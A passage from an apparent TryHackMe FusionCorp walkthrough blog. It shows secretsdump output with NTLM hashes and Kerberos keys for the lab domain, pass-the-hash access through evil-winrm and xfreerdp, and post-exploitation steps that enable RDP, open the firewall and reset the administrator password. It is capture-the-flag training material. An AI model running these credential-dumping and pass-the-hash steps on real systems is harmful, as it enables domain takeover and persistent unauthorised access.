+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<span class="indicator-info">[*]</span> Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+<span class="indicator-info">[*]</span> Searching for pekList, be patient
+<span class="indicator-info">[*]</span> PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
+<span class="indicator-info">[*]</span> Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+FUSION-DC$:1000:aad3b435b51404eeaad3b435b51404ee:59b53b442df7da1ea13a19f824f7f95e:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:feabe44b40ad2341cdef1fd95297ef38:::
+fusion.corp\lparker:1103:aad3b435b51404eeaad3b435b51404ee:5a2ed7b4bb2cd206cc884319b97b6ce8:::
+fusion.corp\jmurphy:1104:aad3b435b51404eeaad3b435b51404ee:69c62e471cf61441bb80c5af410a17a3:::
+<span class="indicator-info">[*]</span> Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:4db79e601e451bea7bb01d0a8a1b5d2950992b3d2e3e750ab1f3c93f2110a2e1
+Administrator:aes128-cts-hmac-sha1-96:c0006e6cbd625c775cb9971c711d6ea8
+Administrator:des-cbc-md5:d64f8c131997a42a
+FUSION-DC$:aes256-cts-hmac-sha1-96:18ef88dded4b0070d143c4a14a24fa5102a28597b0d4c6e49c81e17f18c2cc64
+FUSION-DC$:aes128-cts-hmac-sha1-96:13f287ab06010508f627e1b844624a50
+FUSION-DC$:des-cbc-md5:5e31e5d568fbd6b3
+krbtgt:aes256-cts-hmac-sha1-96:82e655601984d4d9d3fee50c9809c3a953a584a5949c6e82e5626340df2371ad
+krbtgt:aes128-cts-hmac-sha1-96:63bf9a2734e81f83ed6ccb1a8982882c
+krbtgt:des-cbc-md5:167a91b383cb104a
+fusion.corp\lparker:aes256-cts-hmac-sha1-96:4c3daa8ed0c9f262289be9af7e35aeefe0f1e63458685c0130ef551b9a45e19a
+fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
+fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
+fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
+fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
+fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
+<span class="indicator-info">[*]</span> Cleaning up... 
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Now that we have <code>administrator</code>&rsquo;s hash we could use this hash to authenticate to winrm:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">evil-winrm</span> <span class="flag">-i</span> $target <span class="flag">-u</span> administrator <span class="flag">-H</span> 9653b02d945329c7270525c4c2a69c67
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\Administrator\Documents> cd ..
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\Administrator> tree /f
+Folder PATH listing
+Volume serial number is 82D1-EB4D
+C:.
+ÃÄÄÄ3D Objects
+ÃÄÄÄContacts
+ÃÄÄÄDesktop
+³       flag.txt
+³
+ÃÄÄÄDocuments
+ÃÄÄÄDownloads
+ÃÄÄÄFavorites
+³   ³   Bing.url
+³   ³
+³   ÀÄÄÄLinks
+ÃÄÄÄLinks
+³       Desktop.lnk
+³       Downloads.lnk
+³
+ÃÄÄÄMusic
+ÃÄÄÄPictures
+ÃÄÄÄSaved Games
+ÃÄÄÄSearches
+ÀÄÄÄVideos
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\Administrator> type desktop\flag.txt
+THM{f72988e57bfc1deeebf2115e10464d15}
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Last flag: THM{f72988e57bfc1deeebf2115e10464d15}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<hr>
+<h1 id="4-beyond-root">4. Beyond Root<a hidden class="anchor" aria-hidden="true" href="#4-beyond-root">#</a></h1>
+<p>This is the beyond root section where additional post-exploitation and assessment are conducted as the <code>system</code> user after compromising the target.</p>
+<h3 id="41-enabling-rdp">4.1. Enabling RDP<a hidden class="anchor" aria-hidden="true" href="#41-enabling-rdp">#</a></h3>
+<p>Enable RDP &amp; Enable the RDP firewall rule:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\Administrator\Documents> Set-ItemProperty <span class="flag">-Path</span> <span class="string">"HKLM:\System\CurrentControlSet\Control\Terminal Server"</span> <span class="flag">-Name</span> <span class="string">"fDenyTSConnections"</span> <span class="flag">-Value</span> 0
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\Administrator\Documents> Enable-NetFirewallRule <span class="flag">-DisplayGroup</span> <span class="string">"Remote Desktop"</span>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>Connecting to RDP with the hash got an error:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">xfreerdp3</span> /v:$target /u:administrator /pth:'9653b02d945329c7270525c4c2a69c67' +dynamic-resolution +clipboard
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<img src="/img/FusionCorp/errorRDP.png" alt="" class="img-responsive" loading="lazy" />
+<p>This is probably because RDP doesn&rsquo;t accept an NTLM hash as the password.</p>
+<p>To fix this, change the administrator&rsquo;s password:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:red">*Evil-WinRM*</span> <span style="color: orange; font-weight:bold">PS</span> C:\Users\Administrator\Documents> net user administrator <span class="string">'@Password123!'</span>
+ The command completed successfully.
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<img src="/img/FusionCorp/success.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="42-system-information">4.2. System Information<a hidden class="anchor" aria-hidden="true" href="#42-system-information">#</a></h3>
+<div class="terminal cmd">
+    <div class="terminal-header">
+      <div class="window-controls">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+      </div>
+      <div class="terminal-title">C:\Users\0xblivion&gt;</div>
+    </div>
+    <div class="terminal-content">
+      <pre><code>
+C:\Users\Administrator> systeminfo
+
+Host Name:                 FUSION-DC
+OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00431-10000-00000-AA137
+Original Install Date:     3/3/2021, 3:20:50 AM
+System Boot Time:          7/10/2025, 7:54:04 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 593 MB
+Virtual Memory: Max Size:  3,200 MB
+Virtual Memory: Available: 1,695 MB
+Virtual Memory: In Use:    1,505 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    fusion.corp
+Logon Server:              \\FUSION-DC
+Hotfix(s):                 7 Hotfix(s) Installed.
+                           [01]: KB4601558
+                           [02]: KB4512577
+                           [03]: KB4535680
+                           [04]: KB4577586
+                           [05]: KB4580325
+                           [06]: KB4601393
+                           [07]: KB4601345
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.74.101
+                                 [02]: fe80::65d2:ac40:186a:ea10
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+</code></pre>
+    </div>
+  </div>
+<h3 id="43-vulnerabilities">4.3. Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#43-vulnerabilities">#</a></h3>
+<ul>
+<li><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Missing patches: <span class="m">29</span>
+</span></span><span class="line"><span class="cl">    - KB: patches <span class="m">1182</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4512578: patches <span class="m">194</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5012170: patches <span class="m">169</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5058392: patches <span class="m">156</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4507419: patches <span class="m">48</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5027536: patches <span class="m">24</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5030178: patches <span class="m">20</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5034273: patches <span class="m">16</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4601887: patches <span class="m">16</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4483452: patches <span class="m">8</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4570505: patches <span class="m">8</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5032337: patches <span class="m">8</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5044089: patches <span class="m">8</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4535101: patches <span class="m">8</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4556441: patches <span class="m">8</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5050182: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5009718: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5012328: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4514601: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5037034: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB5041017: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4578966: patches <span class="m">4</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KBRelease Notes: patches <span class="m">2</span> vulnerabilities
+</span></span><span class="line"><span class="cl">    - KB4558997: patches <span class="m">1</span> vulnerability
+</span></span><span class="line"><span class="cl">    - KB4519337: patches <span class="m">1</span> vulnerability
+</span></span><span class="line"><span class="cl">    - KB4465664: patches <span class="m">1</span> vulnerability
+</span></span><span class="line"><span class="cl">    - KB4477029: patches <span class="m">1</span> vulnerability
+</span></span><span class="line"><span class="cl">    - KB4516115: patches <span class="m">1</span> vulnerability
+</span></span><span class="line"><span class="cl">    - KB4487038: patches <span class="m">1</span> vulnerability
+</span></span><span class="line"><span class="cl"><span class="o">[</span>I<span class="o">]</span> KB with the most recent release date
+</span></span><span class="line"><span class="cl">    - ID: KB
+</span></span><span class="line"><span class="cl">    - Release date: <span class="m">20250613</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done. Displaying <span class="m">1909</span> of the <span class="m">1909</span> vulnerabilities found.
+</span></span></code></pre></div><h3 id="44-windows-defender-exclusions">4.4. Windows Defender Exclusions<a hidden class="anchor" aria-hidden="true" href="#44-windows-defender-exclusions">#</a></h3>
+<img src="/img/FusionCorp/exclusion.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="45-scheduled-tasks">4.5. Scheduled Tasks<a hidden class="anchor" aria-hidden="true" href="#45-scheduled-tasks">#</a></h3>
+<div class="terminal cmd">
+    <div class="terminal-header">
+      <div class="window-controls">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+      </div>
+      <div class="terminal-title">C:\Users\0xblivion&gt;</div>
+    </div>
+    <div class="terminal-content">
+      <pre><code>
+C:\Users\Administrator> schtasks /query /fo LIST /v | findstr /V /I "Microsoft" | findstr "TaskName"
+TaskName:                             \Amazon Ec2 Launch - Instance Initialization
+TaskName:                             \CreateExplorerShellUnelevatedTask
+
+</code></pre>
+    </div>
+  </div>
+<div class="terminal cmd">
+    <div class="terminal-header">
+      <div class="window-controls">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+      </div>
+      <div class="terminal-title">C:\Users\0xblivion&gt;</div>
+    </div>
+    <div class="terminal-content">
+      <pre><code>
+C:\Users\Administrator> schtasks /query /TN "\CreateExplorerShellUnelevatedTask" /V /FO LIST
+
+Folder: \
+HostName:                             FUSION-DC
+TaskName:                             \CreateExplorerShellUnelevatedTask
+Next Run Time:                        N/A
+Status:                               Running
+Logon Mode:                           Interactive only
+Last Run Time:                        7/10/2025 8:05:09 PM
+Last Result:                          267009
+Author:                               ExplorerShellUnelevated
+Task To Run:                          C:\Windows\explorer.exe /NOUACCHECK
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:
+Run As User:                          administrator
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+
+</code></pre>
+    </div>
+  </div>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xblivion.dev/tags/tryhackme/">Tryhackme</a></li>
+      <li><a href="https://0xblivion.dev/tags/fusioncorp/">FusionCorp</a></li>
+      <li><a href="https://0xblivion.dev/tags/writeup/">Writeup</a></li>
+      <li><a href="https://0xblivion.dev/tags/walkthrough/">Walkthrough</a></li>
+      <li><a href="https://0xblivion.dev/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://0xblivion.dev/tags/as-rep-roasting/">AS-REP Roasting</a></li>
+      <li><a href="https://0xblivion.dev/tags/kerberos/">Kerberos</a></li>
+      <li><a href="https://0xblivion.dev/tags/backup-operators/">Backup Operators</a></li>
+      <li><a href="https://0xblivion.dev/tags/ntds.dit/">NTDS.DIT</a></li>
+      <li><a href="https://0xblivion.dev/tags/system-hives/">SYSTEM Hives</a></li>
+      <li><a href="https://0xblivion.dev/tags/secretsdump/">Secretsdump</a></li>
+      <li><a href="https://0xblivion.dev/tags/evil-winrm/">Evil-WinRM</a></li>
+      <li><a href="https://0xblivion.dev/tags/windows/">Windows</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xblivion.dev/posts/thm/windows/insane/tryhackme-crocc-crew-writeup/">
+    <span class="title">Next »</span>
+    <br>
+    <span>TryHackMe - Crocc Crew WriteUp</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://0xblivion.dev/">0xblivion.dev</a></span>
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
